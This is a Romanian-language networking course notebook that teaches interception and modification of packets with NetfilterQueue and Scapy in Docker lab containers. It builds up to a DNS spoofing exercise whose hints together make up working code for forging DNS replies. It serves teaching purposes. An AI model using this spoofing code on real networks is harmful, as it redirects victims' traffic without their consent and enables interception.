# Capitolul 6 -- Packet Manipulation

Pana acum am *citit* pachete. Azi le *modificam* in timp real.

Elementul cheie este **NetfilterQueue (NFQueue)** -- un mecanism Linux care
intercepteaza pachete inainte sa fie livrate si le pune intr-o coada unde
un script Python le poate inspecta, modifica, accepta sau bloca.

**Setup:**
```bash
pip install NetfilterQueue scapy
```

**Toate demo-urile se ruleaza in containerele din capitolul3:**
```bash
cd computer-networks/capitolul3
docker compose up -d
```

**Problemă frecventă pe VM-uri (Windows/Linux): dacă containerele pornesc dar dispar imediat din docker ps, rulează comenzile de mai jos pe mașina gazdă (nu în container) și apoi restart:**

```bash
sudo modprobe ip_tables
sudo modprobe iptable_filter
sudo modprobe iptable_nat
sudo modprobe ip_conntrack
docker compose down && docker compose up -d
```

---
## Cum functioneaza NFQueue

Fluxul normal al unui pachet pe Linux:

```
Retea --> [iptables] --> aplicatie
```

Cu NFQueue:

```
Retea --> [iptables] --> NFQueue --> scriptul nostru Python --> accept/drop/modify --> aplicatie
```

Pasul 1: spunem iptables sa trimita pachetele in coada in loc sa le proceseze normal.
Pasul 2: scriptul nostru citeste din coada, face ce vrea cu pachetul, si il accepta sau blocheaza.

**Trei reguli iptables importante:**
```bash
iptables -I INPUT   -j NFQUEUE --queue-num 5   # pachete care vin SPRE aceasta masina
iptables -I OUTPUT  -j NFQUEUE --queue-num 5   # pachete care PLEACA de pe aceasta masina
iptables -I FORWARD -j NFQUEUE --queue-num 5   # pachete care TREC PRIN aceasta masina (router/middle)
```

**FORWARD** e cel mai util pentru noi -- containerele `router` si `middle` forwardeaza
traficul intre subnete, deci putem intercepta orice trece prin ele.


---
## Demo 1 -- Interceptam si observam (fara sa modificam)

Cel mai simplu caz: rutam toate pachetele prin NFQueue si le printam.
Nu modificam nimic -- doar ne uitam.

**Ruleaza in containerul `router`:**
```bash
docker compose exec router bash
```


In [1]:
# observe.py -- salveaza in containerul router si ruleaza cu python3
# Intercepteaza toate pachetele forwarded si le afiseaza

from scapy.all import IP, TCP, UDP, ICMP
from netfilterqueue import NetfilterQueue as NFQ
import os

def proceseaza(pachet):
    octeti = pachet.get_payload()
    p = IP(octeti)

    proto = "TCP"  if p.haslayer(TCP)  else \
            "UDP"  if p.haslayer(UDP)  else \
            "ICMP" if p.haslayer(ICMP) else \
            f"proto={p.proto}"

    print(f"  {proto:<5} {p.src:<16} --> {p.dst:<16}  TTL={p.ttl}")

    # IMPORTANT: trebuie sa acceptam sau sa blocam fiecare pachet
    # daca nu chemam accept() sau drop(), pachetul ramane blocat in coada
    pachet.accept()

queue = NFQ()
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 5")
    print("Interceptez pachete forwarded... (Ctrl+C pentru stop)")
    print(f"{'Proto':<5} {'Sursa':<16}   {'Destinatie':<16}  TTL")
    print("-" * 55)
    queue.bind(5, proceseaza)
    queue.run()
except KeyboardInterrupt:
    print("\nOpresc si curat regula iptables...")
    os.system("iptables -D FORWARD 1")
    queue.unbind()


ModuleNotFoundError: No module named 'netfilterqueue'

**Testeaza:**
```bash
# din containerul client, ping spre server
docker compose exec client bash -c "ping -c 3 198.10.0.2"
```

Vei vedea pachetele ICMP aparand in router pe masura ce trec prin el.
Clientul si server-ul nu stiu ca cineva se uita.


---
## Demo 2 -- Blocam un IP specific

Acum facem ceva cu pachetele: daca vin de la `198.10.0.2` (server), le blocam.
Server-ul va trimite pachete, dar nu vor ajunge nicaieri.

**Ruleaza in containerul `router`:**


In [ ]:
# block_ip.py
from scapy.all import IP
from netfilterqueue import NetfilterQueue as NFQ
import os

IP_BLOCAT = "198.10.0.2"

def proceseaza(pachet):
    octeti = pachet.get_payload()
    p = IP(octeti)

    if p.dst == IP_BLOCAT:
        print(f"  DROP: {p.src} --> {p.dst}  ({p.summary()})")
        pachet.drop()
    else:
        print(f"  ACCEPT: {p.src} --> {p.dst}")
        pachet.accept()

queue = NFQ()
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 5")
    print(f"Blochez traficul de la {IP_BLOCAT}... (Ctrl+C pentru stop)")
    queue.bind(5, proceseaza)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables -D FORWARD 1")
    queue.unbind()
    print("Regula stearsa.")


**Testeaza:**
```bash
# din containerul server, incearca sa dai ping la client
docker compose exec server bash -c "ping -c 3 172.10.0.2"
# nu va primi raspuns -- pachetele sunt blocate la router

# dar clientul poate da ping server-ului fara probleme
docker compose exec client bash -c "ping -c 3 198.10.0.2"
```

Asta e baza unui firewall -- aceleasi principii, mai multe reguli.


---
## Demo 3 -- Modificam un pachet in tranzit

Pasul urmator: nu doar citim sau blocam -- schimbam continutul pachetului
inainte sa-l trimitem mai departe.

Vom modifica **TTL-ul** fiecarui pachet care trece prin router, setandu-l la 1.

De ce TTL?
1. E vizibil imediat in tcpdump
2. Nu strica checksum-ul IP (il recalculam)
3. E un exemplu clar ca am atins pachetul

**Ruleaza in containerul `router`:**


In [ ]:
# modify_ttl.py
from scapy.all import IP
from netfilterqueue import NetfilterQueue as NFQ
import os

def proceseaza(pachet):
    octeti = pachet.get_payload()
    p = IP(octeti)

    ttl_original = p.ttl
    p.ttl = 1

    # IMPORTANT: dupa orice modificare trebuie sa stergem
    # campurile calculate automat (len, checksum) ca scapy sa le recalculeze
    del p.chksum
    del p.len

    print(f"  {p.src} --> {p.dst}  TTL: {ttl_original} --> {p.ttl}")

    pachet.set_payload(bytes(p))
    pachet.accept()

queue = NFQ()
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 5")
    print("Modific TTL la 1 pentru toate pachetele... (Ctrl+C pentru stop)")
    queue.bind(5, proceseaza)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables -D FORWARD 1")
    queue.unbind()


**Testeaza cu tcpdump:**
```bash
# terminal 1: in router, ruleaza modify_ttl.py
# terminal 2: in server, porneste tcpdump
docker compose exec server bash -c "tcpdump -i eth0 -nn -v icmp"

# terminal 3: din client, ping spre server
docker compose exec client bash -c "ping -c 3 198.10.0.2"
```

Vei vedea in tcpdump ca TTL-ul pachetelor care ajung la server e 1 in loc de valoarea normala.

**Asta e exact mecanismul DNS spoofing-ului** -- interceptam, modificam un camp
(IP-ul din raspunsul DNS in loc de TTL), si trimitem mai departe.


---
## Challenge -- DNS Spoofing

Acum combini tot ce ai invatat: NFQueue + modificare pachete + DNS.

**Obiectiv:** interceptezi traficul DNS care trece prin `router` si
modifici raspunsurile astfel incat `fmi.unibuc.ro` sa rezolve la `1.2.3.4`
in loc de IP-ul real.

**Verificare:**
```bash
# din containerul server, dupa ce rulezi atacul:
docker compose exec server bash -c "ping fmi.unibuc.ro"
# PING fmi.unibuc.ro (1.2.3.4) <-- daca vezi asta, ai reusit
```

**Setup:**
```bash
# in containerul router
docker compose exec router bash
# ruleaza dns_spoof.py aici
```


In [ ]:
# dns_spoof.py -- STUDENT VERSION
# Completeaza sectiunile marcate cu TODO

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR
from netfilterqueue import NetfilterQueue as NFQ
import os

IP_FALS = "1.2.3.4"
TARGET  = b"fmi.unibuc.ro."

def modifica_dns(pachet):
    octeti = pachet.get_payload()
    p = IP(octeti)

    # TODO 1: verifica daca pachetul are layer UDP si DNSRR
    # (DNSRR = DNS Resource Record = un reply DNS, nu o cerere)
    # if p.haslayer(???) and p.haslayer(???):

        # TODO 2: verifica daca query-ul e pentru domeniul nostru tinta
        # Hint: p[DNSQR].qname contine numele interogat
        # if p[???].qname == TARGET:

            print(f"[PRINS] DNS reply pentru {TARGET.decode()} --> modificam la {IP_FALS}")

            # TODO 3: modifica raspunsul DNS
            # Hint: p[DNS].an = DNSRR(rrname=???, rdata=???)
            # si p[DNS].ancount = 1

            # TODO 4: sterge campurile calculate (len si chksum) pentru IP si UDP
            # del p[IP].???
            # del p[IP].???
            # del p[UDP].???
            # del p[UDP].???

            # TODO 5: pune pachetul modificat inapoi in coada
            # pachet.set_payload(???)

    pachet.accept()

queue = NFQ()
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
    queue.bind(10, modifica_dns)
    print(f"DNS spoofing activ: {TARGET.decode()} --> {IP_FALS}")
    print("Testeaza cu: ping fmi.unibuc.ro (din containerul server)")
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    queue.unbind()
    print("Oprit.")


---
## Hints daca esti blocat

**Hint 1 -- cum verifici layerele:**
```python
p.haslayer(UDP)    # True/False
p.haslayer(DNSRR)  # True daca e un DNS reply cu raspuns
p.haslayer(DNSQR)  # True daca are o intrebare DNS
```

**Hint 2 -- cum construiesti raspunsul DNS fals:**
```python
p[DNS].an = DNSRR(rrname=p[DNSQR].qname, rdata="1.2.3.4")
p[DNS].ancount = 1
```

**Hint 3 -- campurile de sters dupa modificare:**
```python
del p[IP].len
del p[IP].chksum
del p[UDP].len
del p[UDP].chksum
```

**Hint 4 -- cum pui pachetul modificat inapoi:**
```python
pachet.set_payload(bytes(p))
```
